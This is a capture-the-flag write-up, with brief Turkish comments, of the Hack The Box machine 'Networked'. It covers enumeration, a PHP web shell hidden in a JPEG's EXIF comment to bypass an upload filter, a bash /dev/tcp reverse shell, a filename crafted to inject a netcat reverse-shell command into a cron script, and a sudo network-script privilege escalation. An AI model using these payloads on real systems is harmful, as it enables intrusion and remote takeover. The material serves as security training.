---
title: "[HTB] Networked Writeup"
layout: post
---

---
```zsh
➜  ~ nmap -sS -sV -sC -p- -A -O 10.10.10.146
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-14 15:05 +03
Nmap scan report for 10.10.10.146
Host is up (0.065s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
443/tcp closed https
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.2 - 4.9 (91%), Linux 3.13 or 4.2 (90%), Linux 4.10 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Asus RT-AC66U WAP (90%), Linux 3.11 - 3.12 (90%), Linux 3.2 (90%), Linux 4.1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   65.26 ms 10.10.14.1
2   65.31 ms 10.10.10.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.65 seconds
```
---
```zsh
➜  ~ curl -s -XGET 10.10.10.146
<html>
<body>
Hello mate, were building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
```
```zsh
➜  ~ wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.146/FUZZ --hc=404 -c 

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.146/FUZZ
Total requests: 207643

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                       
===================================================================

000000164:   301        7 L      20 W     236 Ch      "uploads"                                                                                                                                                                                                              
000001527:   301        7 L      20 W     235 Ch      "backup"
```
---
```zsh
➜  ~ curl -XGET 10.10.10.146/backup/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /backup</title>
 </head>
 <body>
<h1>Index of /backup</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a>       </td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/tar.gif" alt="[   ]"></td><td><a href="backup.tar">backup.tar</a>             </td><td align="right">2019-07-09 13:33  </td><td align="right"> 10K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>
```
---
```zsh
➜  ~ curl -s -XGET 10.10.10.146/backup/backup.tar --output backup.tar
➜  ~ file backup.tar 
backup.tar: POSIX tar archive (GNU)
```
---
```zsh
➜  ~ mkdir backup
➜  ~ mv backup.tar backup
➜  ~ cd backup 
➜  backup ls
backup.tar
➜  backup tar -vxf backup.tar  
index.php
lib.php
photos.php
upload.php 
```
---
```zsh
➜  backup curl -XGET 10.10.10.146/photos.php
<html>
<head>
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;margin:0px auto;}
.tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;}
.tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;}
.tg .tg-0lax{text-align:left;vertical-align:top}
@media screen and (max-width: 767px) {.tg {width: auto !important;}.tg col {width: auto !important;}.tg-wrap {overflow-x: auto;-webkit-overflow-scrolling: touch;margin: auto 0px;}}</style>
</head>
<body>
Welcome to our awesome gallery!</br>
See recent uploaded pictures from our community, and feel free to rate or comment</br>
<div class="tg-wrap"><table class="tg">
<tr>
<td class="tg-0lax">uploaded by 127_0_0_4.png<br><img src='uploads/127_0_0_4.png' width=100px></td>
<td class="tg-0lax">uploaded by 127_0_0_3.png<br><img src='uploads/127_0_0_3.png' width=100px></td>
<td class="tg-0lax">uploaded by 127_0_0_2.png<br><img src='uploads/127_0_0_2.png' width=100px></td>
<td class="tg-0lax">uploaded by 127_0_0_1.png<br><img src='uploads/127_0_0_1.png' width=100px></td>
</tr>
</table></div>
</body>
</html>
```
---
```zsh
➜  backup curl -XGET 10.10.10.146/upload.php
<form action="/upload.php" method="post" enctype="multipart/form-data">
 <input type="file" name="myFile">
 <br>
<input type="submit" name="submit" value="go!">
</form>
```
---
```php
➜  backup cat lib.php 
<?php

function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}

function displayform() {
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
 <input type="file" name="myFile">
 <br>
<input type="submit" name="submit" value="go!">
</form>
<?php
  exit();
}


?>
```
---
```php
➜  backup exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' malicious.jpeg 
1 image files updated
➜  backup mv malicious.jpeg malicious.php.jpeg
```
#### lib.php dosyasındaki kontrol doğru sağlanmadığı için, dosya formatı değiştirilerek basitçe bypass edilebilir.


---
```html
➜  backup curl -s -XGET 10.10.10.146/photos.php
<html>
<head>
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;margin:0px auto;}
.tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;}
.tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;}
.tg .tg-0lax{text-align:left;vertical-align:top}
@media screen and (max-width: 767px) {.tg {width: auto !important;}.tg col {width: auto !important;}.tg-wrap {overflow-x: auto;-webkit-overflow-scrolling: touch;margin: auto 0px;}}</style>
</head>
<body>
Welcome to our awesome gallery!</br>
See recent uploaded pictures from our community, and feel free to rate or comment</br>
<div class="tg-wrap"><table class="tg">
<tr>
<td class="tg-0lax">uploaded by 10_10_14_12.php.jpeg<br><img src='uploads/10_10_14_12.php.jpeg' width=100px></td>
<td class="tg-0lax">uploaded by 127_0_0_4.png<br><img src='uploads/127_0_0_4.png' width=100px></td>
<td class="tg-0lax">uploaded by 127_0_0_3.png<br><img src='uploads/127_0_0_3.png' width=100px></td>
<td class="tg-0lax">uploaded by 127_0_0_2.png<br><img src='uploads/127_0_0_2.png' width=100px></td>
</tr>
<tr>
<td class="tg-0lax">uploaded by 127_0_0_1.png<br><img src='uploads/127_0_0_1.png' width=100px></td>
</tr>
</table></div>
</body>
</html>
```
---
```zsh
➜  backup  curl -s -XGET --url "http://10.10.10.146/uploads/10_10_14_12.php.jpeg?cmd=id" --output payload; cat payload
ÿØÿàJFIFÿþ,<pre>uid=48(apache) gid=48(apache) groups=48(apache)
ÿÛ
( �%!1!%)+...383-7(-.+
++++--+-++7++7++--+-77+++---++++-++++-+++--+-++++++ÿÂ"ÿÄÿÄ,1!QAq¡±2a"ÁðñÑÿÄÿÄÿÚ
                                                                               ?ö#eÝqAèú1 
Õ6^FÆµ]PbM4^7p9Júo!0=FRB£«ÉS~@tÆµ]QQOgÄ£èÊÉt¾\rÕ9§ß¡e�ÕuDfæê³_YT§ø£       jºäqaz>RG\q¦V§6£èÀÙ%ÏÁØrI
¨i¥?¦sÝUn»³ÜGÑô`(                                        åq"xX;G$0ºÔ²$µN8/
unÈÆ-<Þ¿hê9¥Báu%Js+¶_ Pðí¡×ÈÈ4»®(oÑªKYºQfI9ÿËÈ¾á}ô2)%ádp¢
]ë`9Êúkò1ÉA
Ãþ¥ÛØÅÛÊW0¢°¸M­ÒcâQ	
                        Ü@<VqW!p06OÉsðvPªfËCêØ¬¸þÌtG<¡½óËúâ{x¾?]Ão\©|ºÎ4¯þÜQú¾ÂàÃ+%5äfÐÆê
a
 ÈX\
    ÆÄw£¡p   CqÑØ~_ðë9aXs¾áýÇ×p.=Ï×piw\Qonµ}ÉK:¼³±f9ïD.:äÍ
                                                          g5@6ÄÂà(Ðª#
££(Ú@0¤B¤
                   ÂÌ³àüÛx¿ªknÏ'À	-f"æ$rÒUW@cBFfÑu4`FD©`4FmAa¨(*hj0ÓÚ@QÑ,	
Sjm!¦a!x²|r(½:Õönµ}                                                             «¡E)/ÈëG<PáÍ^Âíâþ@uÉ·ù�]×ul¡Ñ´ifh
|¼6\M´8ÙÃPPS¨ÀLR

Rk!Lu                       Y» y%ý¸ëÂ´BNT
Ó/ôg4öOÕõ6
   Jªâ)P/ê¦ÂQ¡#14Æ£¡É0Ê`vl¡Ñ,Ë>ÁÇ	êú
¡³,È.åá_@OÓ_íD'ä²Ë=bz¾ wÃ	êúA Y®(íeò_ÛJ%gÈì#êmÍ±!I*àNÂZ$F06°4

 ÖÅ4dQ
Âyö\L

ªêdq¦U¦È4»®(giP´ÓjVu|¼»Hu]DÓT7[#>@£�VU®\M¨³wÕQ4£LÃf÷
èd7,¦òûHu]HÎ·?Ó"fÒWP8À
lbÓº6M4ÚÉfóÜu
             2Ïðíá×³9%
fÝaä|?SÓº1*\êå0ÄyØAàv ¨£(hÈL(hC(Pºäc¯ÈêÏ±NèÃ°¸Z>Àç'yn9uÅOnõ]ÁKpþNZ$çü_/ #,y,å? _	xÑªÀ+Ë¡£1ÔÀ4£Ó*ÊMb5k¸
                     ©                                                                                       åp¬9¾Tõ£ì$å?Ó$O¸Z>Àsöß}aLëlí¡Ð,Ë>À÷?]Ãkñ¥+¾µ <þÜ=·ß`p`ü¯ºú@MÏúî?ªs"VC¸�¤}ö2/Ç+ö(ÈÄm>»Jæ(ÊÀe
                         dBh@©¦µ5A]â¢°
                                      9ÞmõÜÙ
                                            :wbMß`:_pþ»7Ty2#Kºâ¿·Z¾ÆE-Cù*Õj\ÿåûõÜÕ'kår%==ùîJûìMþ6ß©xÈMÜ¸a (`ÕTÚ
B«NÚ#ê~<Ðs½°çredïp!"Èµr¢M@-MHRàØÊgD0äð¢eb%ý¸                                  .ë³g aI6OTTÿåäm£ÕõK«£ÍRÏ2E}7Ë¡)Ê¦\2ú­ÜÀ7«êVR­k                                       êú
J    ¶uYäóGNÎCGÉsðvë                                                      ¶n[É                                              +EÐW:¢æ¨ÀLL´¸j«JhãyÑ³¥]ñ`n'«, ZG^'	&é¸
¬9:Ó,m¯©UeÇôÎ`õ}@P¾Ì³àüÄ<þÜúF¥ý.þ@tPæõ7\ mº=ùÕéþ<Ø¡É;äÀC¶àÖ�Òî¸£¶NÅòòr_M~_´uPÿÙ
```
---
```html
 view-source:http://10.10.10.146/uploads/10_10_14_12.php.jpeg?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.12%2F1234%200%3E%261
```
# Yüklenilen php.jpeg dosyası web tarayıcı ile bulunarak çalıştırılabilir. İçine koyulan cmd parametresi ile içeride komut çalıştırılabilmektedir.
---
```zsh
➜  backup  nc -lvp 1234
listening on [any] 1234 ...
10.10.10.146: inverse host lookup failed: Unknown host
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.146] 55852
bash: no job control in this shell
bash-4.2$ 
```
---
```zsh
bash-4.2$ cd /home
cd /home
bash-4.2$ ls  
lcs
guly
bash-4.2$ d guly
cd guly
bash-4.2$ ls -lsa
ls -lsa
total 28
0 drwxr-xr-x. 2 guly guly 159 Jul  9 13:40 .
0 drwxr-xr-x. 3 root root  18 Jul  2 13:27 ..
0 lrwxrwxrwx. 1 root root   9 Jul  2 13:35 .bash_history -> /dev/null
4 -rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
4 -rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
4 -rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
4 -rw-------  1 guly guly 639 Jul  9 13:40 .viminfo
4 -r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
4 -rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
4 -r--------. 1 guly guly  33 Oct 30  2018 user.txt
bash-4.2$ cat crontab.guly
cat crontab.guly
```
---
```php
*/3 * * * * php /home/guly/check_attack.php
```
```zsh
bash-4.2$ cat check_attack.php
```
---
```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
---
# check_attack.php dosyası içerisinde sistem komutu olarak nohup' u kontrolsüz şekilde çağırdığı için ';' karakteri ile bir sonraki komut olarak netcat shelli çağırılabilir.
---
```zsh
bash-4.2$ cd /var/www/html/uploads
cld /var/www/html/uploads
bash-4.2$ ls -lsa
ls -lsa
total 24
0 drwxrwxrwx. 2 root   root    168 Nov 14 13:56 .
0 drwxr-xr-x. 4 root   root    103 Jul  9 13:30 ..
4 -rw-r--r--  1 apache apache 2654 Nov 14 13:21 10_10_14_12.php.jpeg
4 -rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_1.png
4 -rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_2.png
4 -rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_3.png
4 -rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_4.png
4 -r--r--r--. 1 root   root      2 Oct 30  2018 index.html
bash-4.2$ touch "; nc 10.10.14.12 4444 -c bash"
touch "; nc 10.10.14.12 4444 -c bash"
bash-4.2$ ls
ls
10_10_14_12.php.jpeg
127_0_0_1.png
127_0_0_2.png
127_0_0_3.png
127_0_0_4.png
; nc 10.10.14.12 4444 -c bash
index.html
bash-4.2$ 
```
---
```zsh
➜  backup  nc -lvp 4444
listening on [any] 4444 ...
10.10.10.146: inverse host lookup failed: Unknown host
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.146] 57466
python -c 'import pty;pty.spawn("/bin/bash");'; id
[guly@networked ~]$ id
id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
[guly@networked ~]$ 
```
---
```zsh
[guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$ 
```
---
```zsh
[guly@networked ~]$ cat /usr/local/sbin/changename.sh  
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
[guly@networked ~]$ 
```
---
```zsh
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
let_me_go bash
let_me_go bash
interface PROXY_METHOD:
let_me_go bash
let_me_go bash
interface BROWSER_ONLY:
let_me_go bash
let_me_go bash
interface BOOTPROTO:
let_me_go bash
let_me_go bash
[root@networked network-scripts]# wc -c /root/root.txt
wc -c /root/root.txt
33 /root/root.txt
[root@networked network-scripts]#
```
---


# Author <a href=" https://twitter.com/SectionText">SectionText</a> 
---